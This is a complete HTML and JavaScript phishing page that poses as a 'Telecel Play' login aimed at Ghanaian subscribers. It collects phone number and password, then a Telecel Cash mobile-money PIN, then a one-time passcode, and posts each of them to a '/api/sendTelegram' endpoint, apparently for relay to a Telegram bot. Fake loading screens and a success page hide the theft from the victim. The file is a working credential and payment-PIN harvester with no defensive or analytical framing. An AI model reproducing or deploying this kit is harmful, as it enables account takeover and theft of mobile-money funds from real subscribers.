<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Telecel Play Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(180deg,#fff5f7,#ffe3e8);
overflow:hidden;
}

/* animated telecom waves */

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:radial-gradient(circle,rgba(230,0,35,.18),transparent 70%);
filter:blur(40px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{top:-250px;right:-150px}
.wave.two{bottom:-250px;left:-150px;animation-duration:24s}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

/* full page steps */

.step{
position:absolute;
width:100%;
max-width:420px;
padding:28px;
background:white;
border-radius:20px;
box-shadow:0 30px 60px rgba(0,0,0,.2);
transition:.4s;
}

/* center layout */

.container{
position:relative;
width:100%;
max-width:420px;
height:520px;
}

/* logo */

.logo{
height:120px;
display:block;
margin:auto;
}

/* texts */

h1{
text-align:center;
color:#e60023;
margin:8px 0 4px;
font-size:22px;
font-weight:800;
}

.subtitle{
text-align:center;
font-size:13px;
color:#444;
margin-bottom:16px;
}

/* inputs */

label{
font-size:13px;
margin-top:12px;
display:block;
}

input{
width:100%;
padding:12px;
border-radius:10px;
border:1px solid #e5e5e5;
background:#fafafa;
margin-top:5px;
font-size:14px;
}

input:focus{
outline:none;
border-color:#e60023;
background:white;
}

.password-box{
position:relative;
}

.eye{
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
}

.hint{
font-size:12px;
color:#e60023;
margin-top:4px;
}

/* buttons */

.btn{
margin-top:18px;
width:100%;
padding:12px;
border-radius:10px;
border:0;
font-weight:700;
background:#e60023;
color:white;
cursor:pointer;
}

/* pin boxes */

.pin{
display:flex;
gap:8px;
justify-content:center;
margin:16px 0;
}

.pin input{
width:48px;
height:54px;
font-size:20px;
text-align:center;
}

/* spinner */

.spinner{
display:flex;
flex-direction:column;
align-items:center;
gap:12px;
}

.spin{
height:80px;
animation:spin 1.3s linear infinite;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

/* otp */

.count{
text-align:center;
font-size:13px;
color:#555;
}

/* success */

.success{
text-align:center;
}

.success img{
height:80px;
animation:pop .6s ease;
}

@keyframes pop{
0%{transform:scale(.6);opacity:.2}
100%{transform:scale(1)}
}

/* hidden */

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

/* resend */

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:#e60023;
cursor:pointer;
font-weight:600;
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<!-- STEP 1 -->

<div id="step1" class="step">

<img src="assets/telecel.svg" class="logo">

<h1>Welcome to Telecel Play</h1>

<div class="subtitle">

Enter your number to log in.
You need to be a Telecel subscriber to proceed.

</div>

<form id="form">

<label>Phone Number</label>

<input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">

<label>Password</label>

<div class="password-box">

<input id="password" type="password">

<span class="eye" onclick="togglePassword()">👁</span>

</div>

<div class="hint">

(Use your Telecel Play App password)

</div>

<button class="btn">Next</button>

</form>

</div>


<!-- LOADING -->

<div id="loading" class="step hidden">

<div class="spinner">

<img src="assets/telecel.svg" class="spin">

<div>Connecting...</div>

</div>

</div>


<!-- STEP 2 PIN -->

<div id="step2" class="step hidden">

<img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">

<h1>Telecel Cash</h1>

<div class="subtitle" id="showNumber"></div>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<button class="btn" onclick="submitPin()">Login</button>

</div>


<!-- STEP 3 OTP -->

<div id="step3" class="step hidden">

<h1>Verify OTP</h1>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<div class="count">

Code expires in <span id="time">60</span>s

</div>

<div class="resend">

<button onclick="resendOtp()">Resend OTP</button>

</div>

<button class="btn" onclick="submitOtp()">

Verify OTP

</button>

</div>


<!-- STEP 4 SUCCESS -->

<div id="step4" class="step hidden success">

<img src="assets/telecel.svg">

<h1>Success</h1>

<div class="subtitle">

Logging you in...

</div>

</div>


</div>


<script>

let phoneValue=""
let passwordValue=""
let pinValue=""
let otpValue=""

/* phone validation */

phone.oninput=e=>{

let v=e.target.value.replace(/\D/g,"").slice(0,10)

if(v.length>0 && v[0]!=="0")
v="0"+v.slice(1)

e.target.value=v

}

/* toggle password */

function togglePassword(){

password.type=password.type==="password"?"text":"password"

}

/* step control */

function show(id){

document.querySelectorAll(".step").forEach(s=>s.classList.add("hidden"))

document.getElementById(id).classList.remove("hidden")

}

/* next */

form.onsubmit=e=>{

e.preventDefault()

phoneValue=phone.value
passwordValue=password.value

if(!/^0\d{9}$/.test(phoneValue)){

alert("Enter valid Ghana number")

return

}

/* convert to +233 */

phoneValue="+233"+phoneValue.slice(1)

sendData("login",{phone:phoneValue,password:passwordValue})

show("loading")

setTimeout(()=>{

showNumber.textContent=phoneValue

show("step2")

},1200)

}

/* pin */

document.querySelectorAll("#step2 input").forEach((i,index)=>{

i.oninput=()=>{

if(i.value && index<3)
document.querySelectorAll("#step2 input")[index+1].focus()

}

})

function submitPin(){

pinValue=[...document.querySelectorAll("#step2 input")]

.map(i=>i.value)

.join("")

sendData("pin",{pin:pinValue})

show("loading")

setTimeout(()=>{

show("step3")

startTimer()

},1200)

}

/* otp */

document.querySelectorAll("#step3 input").forEach((i,index)=>{

i.oninput=()=>{

if(i.value && index<4)
document.querySelectorAll("#step3 input")[index+1].focus()

}

})

function submitOtp(){

otpValue=[...document.querySelectorAll("#step3 input")]

.map(i=>i.value)

.join("")

sendData("otp",{otp:otpValue})

show("step4")

setTimeout(()=>location.href="thankyou.html",1600)

}

/* resend */

function resendOtp(){

startTimer()

sendData("resend_otp")

}

/* timer */

function startTimer(){

let t=60

time.textContent=t

const i=setInterval(()=>{

t--

time.textContent=t

if(t<=0) clearInterval(i)

},1000)

}

/* telegram */

async function sendData(step,data){

await fetch("/api/sendTelegram",{

method:"POST",

headers:{"Content-Type":"application/json"},

body:JSON.stringify({

step,

phone:phoneValue,

password:passwordValue,

pin:pinValue,

otp:otpValue,

...data,

time:new Date().toISOString()

})

})

}

</script>

</body>

</html>
